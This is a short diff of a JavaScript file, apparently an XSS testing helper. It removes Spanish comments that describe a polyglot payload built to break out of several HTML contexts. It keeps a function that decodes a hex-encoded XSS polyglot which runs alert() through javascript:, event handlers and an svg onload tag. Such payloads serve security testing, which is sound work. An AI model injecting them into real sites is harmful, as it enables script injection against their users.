@@ -23,9 +23,6 @@ function XSS(){
 	 document.getElementById("javascript").value = xss
 }
 
-//Payload polyglot mas moderno, intenta romper varios contextos a la vez
-//(atributo con/sin comillas, javascript:, </style>/</title>/</textarea>/</script>
-//ya abiertos, y un <svg onload=...> por si nada de lo anterior cuela)
 function XSSModerno(){
 	 let xss = hex2a("6A6156617343726970743A2F2A2D2F2A602F2A5C602F2A272F2A222F2A2A2F282F2A202A2F6F4E636C69436B3D616C657274282920292F2F2530442530412530642530612F2F3C2F7374596C652F3C2F7469744C652F3C2F74655874617245612F3C2F7363526970742F2D2D213E5C7833637356672F3C7356672F6F4E6C6F41643D616C65727428292F2F3E5C783365")
 
